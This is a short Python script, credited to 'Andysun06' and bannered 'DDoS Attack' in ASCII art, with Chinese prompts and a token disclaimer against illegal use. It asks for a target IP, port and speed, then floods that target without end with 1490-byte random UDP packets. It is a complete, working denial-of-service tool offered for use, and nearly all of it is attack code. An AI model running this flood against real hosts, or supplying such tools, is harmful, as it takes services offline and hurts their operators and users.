#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import os
import random
import socket
import sys
import time

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##############

if sys.version[0] == "2":
    input = raw_input


def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


clear()
print(" ____  ____                 _   _   _             _     ")
print("|  _ \|  _ \  ___  ___     / \ | |_| |_ __ _  ___| | __ ")
print("| | | | | | |/ _ \/ __|   / _ \| __| __/ _` |/ __| |/ / ")
print("| |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   <  ")
print("|____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\\")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|   作者          : Andysun06                       |")
print ("|   作者github    : https://github.com/Andysun06    |")
print ("|   kali-QQ学习群 : 909533854                       |")
print ("|   版本          : V1.0.0                          |")
print ("\---------------------------------------------------/")
print (" ")
print (" -----------------[请勿用于违法用途]----------------- ")
print (" ")
ip = input("请输入 IP     : ")
port = int(input("攻击端口      : "))
sd = int(input("攻击速度(1~1000) : "))

clear()

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    print ("已发送 %s 个数据包到 %s 端口 %d" % (sent, ip, port))
    time.sleep((1000 - sd) / 2000)
